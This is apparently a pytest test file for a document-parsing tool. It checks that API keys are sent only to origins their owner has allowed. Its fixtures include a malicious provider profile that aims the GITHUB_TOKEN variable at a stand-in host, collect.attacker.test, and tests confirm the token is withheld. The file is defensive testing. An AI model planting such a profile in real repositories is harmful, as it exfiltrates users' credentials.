"""A provider profile's key is bound to the profile's endpoint (`openreading.credentials`).

`openreading.yaml` often arrives with a repository you cloned, so a profile it declares is
untrusted. Without the binding, a committed profile could name any variable no built-in owns,
such as `GITHUB_TOKEN`, point `base_url` at its author's host, and receive the value from your
shell or keychain. These tests prove the binding on every surface: the environment reaches a
remote profile only when `OPENREADING_PROVIDER_ORIGINS` lists its origin, a loopback profile reads
it freely, and a saved key lives under `VAR@origin` so it reaches only that origin. HTTP is respx
and the keychain is the in-memory fake, so nothing leaves the process.
"""

from __future__ import annotations

import io
import json
import sys
import textwrap

import httpx
import pytest
import respx

from openreading import api
from openreading.adapters.registry import install_profiles, make_adapter
from openreading.cli import app as cli
from openreading.credentials import EnvCredentialBroker, endpoint_origin, keychain_environ
from openreading.readiness import backend_readiness
from openreading.testing.sample_pdf import build_sample_pdf
from openreading.types.request import OpenReadingRequest

pytest.importorskip("pymupdf", reason="pymupdf (rasterizer) not installed")

TOKEN = "ghp_canary_never_sent_0001"
ATTACKER = "https://collect.attacker.test"


def _reply(content: str) -> dict:
    return {
        "choices": [{"message": {"content": content}, "finish_reason": "stop"}],
        "usage": {"prompt_tokens": 1, "completion_tokens": 1},
    }


def _profile(base_url: str, key_env: str) -> dict:
    return {
        "kind": "openai-compatible",
        "base_url": base_url,
        "model": "vision-1",
        "key_env": key_env,
    }


def _yaml(**profiles: dict) -> str:
    body = "".join(
        f"  {name}:\n" + "".join(f"    {k}: {v}\n" for k, v in p.items())
        for name, p in profiles.items()
    )
    return "version: 1\nproviders:\n" + body


EXFIL = _yaml(**{"gh-models": _profile(f"{ATTACKER}/v1", "GITHUB_TOKEN")})
SHARED = _yaml(
    **{
        "a-llm": _profile("https://a.example.test/v1", "SHARED_LLM_KEY"),
        "b-llm": _profile("https://b.example.test/v1", "SHARED_LLM_KEY"),
    }
)
LOCAL = _yaml(**{"local-llm": _profile("http://localhost:11434/v1", "LOCAL_LLM_KEY")})


@pytest.fixture
def pdf(tmp_path):
    p = tmp_path / "doc.pdf"
    p.write_bytes(build_sample_pdf())
    return str(p)


def _write(tmp_path, text: str) -> None:
    (tmp_path / "openreading.yaml").write_text(text, encoding="utf-8")


def _run(argv: list[str], capsys) -> tuple[int, str, str]:
    code = cli.main(argv)
    out, err = capsys.readouterr()
    return code, out, err


def _req(slug: str) -> OpenReadingRequest:
    return OpenReadingRequest.model_validate(
        {"document": {"path": "/x.pdf"}, "backend": {"id": slug}}
    )


def _resolved_key(slug: str, broker: EnvCredentialBroker) -> object:
    return broker.resolve(make_adapter(slug).descriptor, _req(slug)).values.get("api_key")


@pytest.mark.parametrize(
    ("slug", "setting", "secret"),
    [
        ("llamaparse-fast", "LLAMA_CLOUD_BASE_URL", "LLAMA_CLOUD_API_KEY"),
        ("chunkr", "OPENREADING_CHUNKR_BASE_URL", "CHUNKR_API_KEY"),
        ("nuextract", "NUEXTRACT_BASE_URL", "NUMIND_API_KEY"),
        (
            "azure-document-intelligence",
            "AZURE_DOCUMENT_INTELLIGENCE_ENDPOINT",
            "AZURE_DOCUMENT_INTELLIGENCE_KEY",
        ),
        ("qwen-vl", "QWEN_VL_ENDPOINT", "QWEN_VL_API_KEY"),
        ("aws-textract", "AWS_ENDPOINT_URL_TEXTRACT", "AWS_SESSION_TOKEN"),
        ("aws-textract", "AWS_ENDPOINT_URL_S3", "AWS_SECRET_ACCESS_KEY"),
        ("anthropic-claude", "ANTHROPIC_BASE_URL", "ANTHROPIC_API_KEY"),
    ],
)
def test_saved_builtin_key_requires_a_trusted_destination_from_dotenv(
    slug, setting, secret, monkeypatch, fake_keychain, tmp_path
):
    from openreading.credentials import load_dotenv

    origin = (
        "https://api.anthropic.com:8443"
        if slug == "anthropic-claude"
        else "https://provider.example.test"
    )
    path = tmp_path / "settings.env"
    path.write_text(f"{setting}={origin}/v1\n")
    monkeypatch.delenv(setting, raising=False)
    load_dotenv(path)
    fake_keychain.store[("openreading", secret)] = "saved"
    broker = EnvCredentialBroker(keychain_environ())
    desc = make_adapter(slug).descriptor
    assert not broker.resolve(desc, _req(slug)).values
    assert ("get", secret) not in fake_keychain.calls
    assert broker.var_source(secret, make_adapter(slug).descriptor) == "missing"
    monkeypatch.setenv("OPENREADING_PROVIDER_ORIGINS", origin)
    assert "saved" in broker.resolve(desc, _req(slug)).values.values()


def test_file_selected_sdk_configuration_requires_an_export(tmp_path, monkeypatch, fake_keychain):
    from openreading.credentials import load_dotenv

    settings = tmp_path / "settings.env"
    settings.write_text(f"AWS_CONFIG_FILE={tmp_path / 'aws-config'}\n")
    monkeypatch.delenv("AWS_CONFIG_FILE", raising=False)
    load_dotenv(settings)
    fake_keychain.store[("openreading", "AWS_SESSION_TOKEN")] = "saved"
    broker = EnvCredentialBroker(keychain_environ())
    desc = make_adapter("aws-textract").descriptor
    assert "aws_session_token" not in broker.resolve(desc, _req(desc.id)).values
    assert ("get", "AWS_SESSION_TOKEN") not in fake_keychain.calls


@pytest.mark.parametrize(
    ("slug", "setting", "url", "secret"),
    [
        ("qwen-vl", "QWEN_VL_ENDPOINT", "http://localhost:8000/v1", "QWEN_VL_API_KEY"),
        (
            "anthropic-claude",
            "ANTHROPIC_BASE_URL",
            "https://API.ANTHROPIC.COM:443",
            "ANTHROPIC_API_KEY",
        ),
        (
            "llamaparse-fast",
            "LLAMA_CLOUD_BASE_URL",
            "https://api.cloud.llamaindex.ai",
            "LLAMA_CLOUD_API_KEY",
        ),
        ("chunkr", "CHUNKR_BASE_URL", "https://api.chunkr.ai", "CHUNKR_API_KEY"),
        ("nuextract", "NUEXTRACT_BASE_URL", "https://nuextract.ai/v1", "NUMIND_API_KEY"),
    ],
)
def test_saved_key_reaches_a_local_or_factory_destination(
    slug, setting, url, secret, fake_keychain, tmp_path
):
    from openreading.credentials import load_dotenv

    path = tmp_path / ".env"
    path.write_text(f"{setting}={url}\n")
    load_dotenv(path)
    fake_keychain.store[("openreading", secret)] = "saved-test-key"
    broker = EnvCredentialBroker(keychain_environ())
    desc = make_adapter(slug).descriptor
    assert "saved-test-key" in broker.resolve(desc, _req(slug)).values.values()


def test_required_key_dotenv_hold_names_the_setting_in_readiness_and_parse(
    fake_keychain, tmp_path, pdf, capsys
):
    from openreading.credentials import load_dotenv
    from openreading.readiness import missing_reason

    slug = "azure-document-intelligence"
    setting = "AZURE_DOCUMENT_INTELLIGENCE_ENDPOINT"
    secret = "AZURE_DOCUMENT_INTELLIGENCE_KEY"
    path = tmp_path / ".env"
    path.write_text(f"{setting}=https://custom.example.test/v1\n")
    load_dotenv(path)
    fake_keychain.store[("openreading", secret)] = "saved-test-key"
    broker = EnvCredentialBroker(keychain_environ())
    ready = backend_readiness(make_adapter(slug), broker=broker)
    assert not ready.ready and ready.keychain_blocked_by == setting
    assert setting in missing_reason(ready)
    code, out, err = _run(["parse", pdf, "--backend", slug], capsys)
    assert code != 0 and setting in err and "export" in err.lower()
    assert "saved-test-key" not in out + err
    assert ("get", secret) not in fake_keychain.calls


@pytest.mark.parametrize(
    ("slug", "line"),
    [
        ("aws-textract", "AWS_PROFILE=dev"),
        ("qwen-vl", "QWEN_VL_ENDPOINT=http://gpu-box.lan:8000/v1"),
    ],
)
@pytest.mark.parametrize("named", [True, False], ids=["named", "default-chain"])
def test_dotenv_allows_dispatch_without_optional_credentials(
    slug, line, named, fake_keychain, tmp_path, pdf, monkeypatch
):
    from unittest.mock import patch

    from openreading.adapters.registry import BUILTIN_ADAPTERS
    from tests.fakes import ScriptedBackend

    backend = ScriptedBackend(slug)
    backend.descriptor = make_adapter(slug).descriptor
    monkeypatch.setitem(BUILTIN_ADAPTERS, slug, lambda: backend)
    path = tmp_path / ".env"
    path.write_text(line + "\n")
    with patch.dict("os.environ", clear=True):
        result = api.run(
            pdf,
            backend=slug if named else None,
            env_file=str(path),
            keychain=True,
            config={"version": 1, "policy": {"backends": [slug, "pymupdf"]}},
        )
    assert result["backend"]["id"] == slug
    assert backend.contexts[0].credentials is None
    assert not fake_keychain.calls


def _stdin(monkeypatch, text: str) -> None:
    stream = io.StringIO(text)
    stream.isatty = lambda: False  # type: ignore[method-assign]
    monkeypatch.setattr(sys, "stdin", stream)


# --- origins ---------------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("url", "origin"),
    [
        ("HTTPS://Api.Example.Test:443/v1/", "https://api.example.test"),
        ("http://LocalHost:80/v1", "http://localhost"),
        ("https://api.example.test:8443/v1", "https://api.example.test:8443"),
        ("http://[::1]:11434/v1", "http://[::1]:11434"),
    ],
)
def test_an_origin_is_scheme_host_and_a_non_default_port(url, origin):
    assert endpoint_origin(url) == origin


def test_the_allow_list_ignores_entries_that_name_no_origin():
    from openreading.credentials import provider_origins

    env = {
        "OPENREADING_PROVIDER_ORIGINS": "openrouter.ai, https://, https://h.test:port, ,"
        "https://API.Groq.com/openai/v1"
    }
    assert provider_origins(env) == frozenset({"https://api.groq.com"})
    assert provider_origins({}) == frozenset()


# --- the environment -------------------------------------------------------------------------


@respx.mock
def test_an_arbitrary_env_name_is_never_sent_to_a_remote_profile(
    tmp_path, pdf, capsys, monkeypatch
):
    monkeypatch.setenv("GITHUB_TOKEN", TOKEN)
    _write(tmp_path, EXFIL)
    route = respx.post(f"{ATTACKER}/v1/chat/completions").mock(
        return_value=httpx.Response(200, json=_reply("# got it"))
    )
    code, out, err = _run(["parse", pdf, "--backend", "gh-models"], capsys)
    assert code != 0
    assert all("authorization" not in call.request.headers for call in route.calls)
    assert TOKEN not in out + err
    # The refusal says why an exported variable was not used, by name and setting only.
    assert "GITHUB_TOKEN is set in the environment but not sent" in err
    assert "OPENREADING_PROVIDER_ORIGINS" in err


@respx.mock
def test_the_env_key_is_sent_once_the_operator_lists_the_origin(tmp_path, pdf, capsys, monkeypatch):
    monkeypatch.setenv("GITHUB_TOKEN", TOKEN)
    # Any spelling of the same origin matches, and a path is ignored.
    monkeypatch.setenv(
        "OPENREADING_PROVIDER_ORIGINS", " https://other.test, HTTPS://Collect.Attacker.Test:443/v1 "
    )
    _write(tmp_path, EXFIL)
    route = respx.post(f"{ATTACKER}/v1/chat/completions").mock(
        return_value=httpx.Response(200, json=_reply("# ok"))
    )
    code, out, err = _run(["parse", pdf, "--backend", "gh-models"], capsys)
    assert code == 0, err
    assert route.calls.last.request.headers["authorization"] == f"Bearer {TOKEN}"


@respx.mock
@pytest.mark.parametrize("env_file", [None, "other.env"])
def test_an_allow_list_from_a_dotenv_file_is_ignored(tmp_path, pdf, capsys, monkeypatch, env_file):
    """A cloned repo's `.env` could list its author's origin and turn the profile its
    `openreading.yaml` declares into a pipe for your exported token. An explicit `--env-file`
    is a file too, so it cannot widen where a key goes either."""
    monkeypatch.setenv("GITHUB_TOKEN", TOKEN)
    _write(tmp_path, EXFIL)
    (tmp_path / (env_file or ".env")).write_text(
        f"OPENREADING_PROVIDER_ORIGINS={ATTACKER}\n", encoding="utf-8"
    )
    route = respx.route().mock(return_value=httpx.Response(200, json=_reply("# got it")))
    argv = ["parse", pdf, "--backend", "gh-models"]
    if env_file:
        argv += ["--env-file", str(tmp_path / env_file)]
    code, out, err = _run(argv, capsys)
    assert code != 0
    assert route.call_count == 0
    assert TOKEN not in out + err
    assert "OPENREADING_PROVIDER_ORIGINS was set by a .env file" in err
    assert "export it in your shell" in err
    code, out, err = _run(["backends"], capsys)
    assert "[backends] gh-models" in err and "export it in your shell" in err
    code, out, err = _run(["keys", "list"], capsys)
    assert "export it in your shell" in err
    assert TOKEN not in out + err


@respx.mock
def test_an_exported_allow_list_still_works_beside_a_dotenv_file(
    tmp_path, pdf, capsys, monkeypatch
):
    monkeypatch.setenv("GITHUB_TOKEN", TOKEN)
    monkeypatch.setenv("OPENREADING_PROVIDER_ORIGINS", ATTACKER)
    _write(tmp_path, EXFIL)
    (tmp_path / ".env").write_text(
        "OPENREADING_PROVIDER_ORIGINS=https://other.test\n", encoding="utf-8"
    )
    route = respx.post(f"{ATTACKER}/v1/chat/completions").mock(
        return_value=httpx.Response(200, json=_reply("# ok"))
    )
    code, _, err = _run(["parse", pdf, "--backend", "gh-models"], capsys)
    assert code == 0, err
    assert route.calls.last.request.headers["authorization"] == f"Bearer {TOKEN}"


@respx.mock
def test_a_loopback_profile_reads_the_env(tmp_path, pdf, capsys, monkeypatch):
    monkeypatch.setenv("LOCAL_LLM_KEY", "sk-local")
    _write(tmp_path, LOCAL)
    route = respx.post("http://localhost:11434/v1/chat/completions").mock(
        return_value=httpx.Response(200, json=_reply("# local"))
    )
    code, _, err = _run(["parse", pdf, "--backend", "local-llm"], capsys)
    assert code == 0, err
    assert route.calls.last.request.headers["authorization"] == "Bearer sk-local"


def test_the_python_api_applies_the_same_binding(pdf, monkeypatch):
    monkeypatch.setenv("GITHUB_TOKEN", TOKEN)
    cfg = {"version": 1, "providers": {"gh-models": _profile(f"{ATTACKER}/v1", "GITHUB_TOKEN")}}
    with respx.mock:
        route = respx.post(f"{ATTACKER}/v1/chat/completions").mock(
            return_value=httpx.Response(200, json=_reply("# got it"))
        )
        with pytest.raises(Exception) as ei:
            api.run(pdf, backend="gh-models", config=cfg)
    assert route.call_count == 0
    assert TOKEN not in str(ei.value)


def test_the_allow_list_never_comes_from_the_keychain(monkeypatch, fake_keychain):
    """Law PS5: an operator knob saved in the keychain would hide where nobody reviews it."""
    monkeypatch.setenv("GITHUB_TOKEN", TOKEN)
    fake_keychain.store[("openreading", "OPENREADING_PROVIDER_ORIGINS")] = ATTACKER
    install_profiles({"gh-models": _profile(f"{ATTACKER}/v1", "GITHUB_TOKEN")})
    assert _resolved_key("gh-models", EnvCredentialBroker(keychain_environ())) is None


def test_readiness_reports_an_ignored_env_var_as_missing_and_names_the_setting(
    tmp_path, capsys, monkeypatch
):
    monkeypatch.setenv("GITHUB_TOKEN", TOKEN)
    _write(tmp_path, EXFIL)
    install_profiles({"gh-models": _profile(f"{ATTACKER}/v1", "GITHUB_TOKEN")})
    r = backend_readiness(make_adapter("gh-models"))
    assert not r.ready
    assert r.required_missing == ["GITHUB_TOKEN"]
    assert r.env_ignored == ["GITHUB_TOKEN"]
    code, out, err = _run(["backends"], capsys)
    assert code == 0
    row = next(ln for ln in out.splitlines() if ln.startswith("gh-models"))
    assert " no " in row and "GITHUB_TOKEN" in row
    assert "OPENREADING_PROVIDER_ORIGINS" in err and ATTACKER in err
    assert TOKEN not in out + err


def test_keys_list_marks_an_ignored_env_var_without_its_value(tmp_path, capsys, monkeypatch):
    monkeypatch.setenv("GITHUB_TOKEN", TOKEN)
    _write(tmp_path, EXFIL)
    code, out, err = _run(["keys", "list"], capsys)
    assert code == 0
    assert ("gh-models", "GITHUB_TOKEN", "env-ignored") in {
        tuple(line.split()) for line in out.splitlines()[1:]
    }
    assert "OPENREADING_PROVIDER_ORIGINS" in err
    code, out, _ = _run(["keys", "list", "--json"], capsys)
    rows = json.loads(out)
    assert {"backend": "gh-models", "var": "GITHUB_TOKEN", "source": "env-ignored"} in rows
    assert TOKEN not in out + err


def test_the_mcp_backends_report_names_an_ignored_env_var(monkeypatch):
    from openreading.mcp_server.backends import backends_report

    monkeypatch.setenv("GITHUB_TOKEN", TOKEN)
    install_profiles({"gh-models": _profile(f"{ATTACKER}/v1", "GITHUB_TOKEN")})
    report = backends_report()
    row = next(r for r in report["backends"] if r["backend"] == "gh-models")
    assert row["ready"] is False and row["env_ignored"] == ["GITHUB_TOKEN"]
    assert row["found"] == []
    assert TOKEN not in json.dumps(report)


# --- the keychain ----------------------------------------------------------------------------


def test_two_profiles_sharing_key_env_never_share_a_saved_key(tmp_path, fake_keychain):
    install_profiles(textwrap_providers(SHARED))
    fake_keychain.store[("openreading", "SHARED_LLM_KEY@https://a.example.test")] = "sk-a"
    broker = EnvCredentialBroker(keychain_environ())
    assert _resolved_key("a-llm", broker) == "sk-a"
    assert _resolved_key("b-llm", broker) is None


def test_a_plain_account_is_never_read_for_a_profile(fake_keychain):
    """Before the binding, `OPENROUTER_API_KEY` saved for one profile reached any profile that
    named it, whatever its host."""
    install_profiles({"gh-models": _profile(f"{ATTACKER}/v1", "GITHUB_TOKEN")})
    fake_keychain.store[("openreading", "GITHUB_TOKEN")] = TOKEN
    broker = EnvCredentialBroker(keychain_environ())
    assert _resolved_key("gh-models", broker) is None
    assert ("get", "GITHUB_TOKEN") not in fake_keychain.calls


def test_keys_set_for_a_profile_writes_the_bound_account(
    tmp_path, capsys, monkeypatch, fake_keychain
):
    _write(tmp_path, SHARED)
    _stdin(monkeypatch, "sk-a\n")
    code, out, err = _run(["keys", "set", "a-llm", "--stdin"], capsys)
    assert code == 0, err
    assert fake_keychain.store == {("openreading", "SHARED_LLM_KEY@https://a.example.test"): "sk-a"}
    assert "Saved SHARED_LLM_KEY for https://a.example.test" in out
    code, out, _ = _run(["keys", "list"], capsys)
    rows = {tuple(line.split()) for line in out.splitlines()[1:]}
    assert ("a-llm", "SHARED_LLM_KEY", "keychain") in rows
    assert ("b-llm", "SHARED_LLM_KEY", "missing") in rows
    code, out, _ = _run(["keys", "unset", "b-llm"], capsys)
    assert (
        code == 0
        and ("openreading", "SHARED_LLM_KEY@https://a.example.test") in fake_keychain.store
    )
    code, out, _ = _run(["keys", "unset", "a-llm"], capsys)
    assert code == 0 and fake_keychain.store == {}
    assert "Removed SHARED_LLM_KEY for https://a.example.test" in out


@respx.mock
def test_a_saved_profile_key_reaches_its_own_endpoint(tmp_path, pdf, capsys, fake_keychain):
    _write(tmp_path, SHARED)
    fake_keychain.store[("openreading", "SHARED_LLM_KEY@https://a.example.test")] = "sk-a"
    route = respx.post("https://a.example.test/v1/chat/completions").mock(
        return_value=httpx.Response(200, json=_reply("# a"))
    )
    code, _, err = _run(["parse", pdf, "--backend", "a-llm"], capsys)
    assert code == 0, err
    assert route.calls.last.request.headers["authorization"] == "Bearer sk-a"


def test_keys_import_binds_a_profile_var_only_when_you_name_the_profile(
    tmp_path, capsys, fake_keychain
):
    _write(tmp_path, SHARED)
    env = tmp_path / "old.env"
    env.write_text("SHARED_LLM_KEY=sk-shared\nREDUCTO_API_KEY=r-key\n", encoding="utf-8")
    code, out, err = _run(["keys", "import", str(env)], capsys)
    assert code == 0, err
    assert fake_keychain.store == {("openreading", "REDUCTO_API_KEY"): "r-key"}
    assert "SHARED_LLM_KEY" in out and "keys import" in out and "a-llm" in out
    assert "line 2" in out  # only the moved line is named for deletion
    code, out, err = _run(["keys", "import", str(env), "b-llm"], capsys)
    assert code == 0, err
    assert fake_keychain.store[("openreading", "SHARED_LLM_KEY@https://b.example.test")] == (
        "sk-shared"
    )
    assert ("openreading", "SHARED_LLM_KEY@https://a.example.test") not in fake_keychain.store
    assert "sk-shared" not in out + err


def test_keys_import_names_the_endpoint_before_binding_a_key(tmp_path, capsys, fake_keychain):
    _write(tmp_path, SHARED)
    env = tmp_path / "old.env"
    env.write_text("SHARED_LLM_KEY=sk-shared\n", encoding="utf-8")
    code, out, err = _run(["keys", "import", str(env)], capsys)
    assert code == 0, err
    # The hint names each profile's origin, so you see where the key would go before you bind it.
    assert "a-llm at https://a.example.test" in out
    assert "b-llm at https://b.example.test" in out
    code, out, err = _run(["keys", "import", str(env), "b-llm"], capsys)
    assert code == 0, err
    binding = out.index("Binding SHARED_LLM_KEY to https://b.example.test")
    assert binding < out.index("Saved SHARED_LLM_KEY")


def test_keys_set_stdin_names_the_endpoint_before_binding_a_key(
    tmp_path, capsys, monkeypatch, fake_keychain
):
    _write(tmp_path, SHARED)
    _stdin(monkeypatch, "sk-a\n")
    code, out, err = _run(["keys", "set", "a-llm", "--stdin"], capsys)
    assert code == 0, err
    binding = out.index("Binding SHARED_LLM_KEY to https://a.example.test")
    assert binding < out.index("Saved SHARED_LLM_KEY")


def test_keys_import_with_an_unknown_slug_moves_nothing(tmp_path, capsys, fake_keychain):
    _write(tmp_path, SHARED)
    env = tmp_path / "old.env"
    env.write_text("SHARED_LLM_KEY=sk-shared\n", encoding="utf-8")
    code, _, err = _run(["keys", "import", str(env), "nope"], capsys)
    assert code == 2 and "unknown backend" in err
    assert fake_keychain.store == {}


def test_a_profile_export_the_origin_allows_is_named_as_shadowing_a_saved_key(
    tmp_path, capsys, monkeypatch, fake_keychain
):
    _write(tmp_path, SHARED)
    monkeypatch.setenv("SHARED_LLM_KEY", "sk-env")
    monkeypatch.setenv("OPENREADING_PROVIDER_ORIGINS", "https://a.example.test")
    _stdin(monkeypatch, "sk-a\n")
    code, out, err = _run(["keys", "set", "a-llm", "--stdin"], capsys)
    assert code == 0, err
    assert "also exported in this shell" in out
    _stdin(monkeypatch, "sk-b\n")
    code, out, err = _run(["keys", "set", "b-llm", "--stdin"], capsys)
    assert code == 0, err
    # b's origin is not allowed, so the export never shadows b's saved key.
    assert "also exported" not in out


def textwrap_providers(text: str) -> dict:
    """The `providers:` block of a YAML string, as `install_profiles` takes it."""
    import yaml

    return yaml.safe_load(textwrap.dedent(text))["providers"]
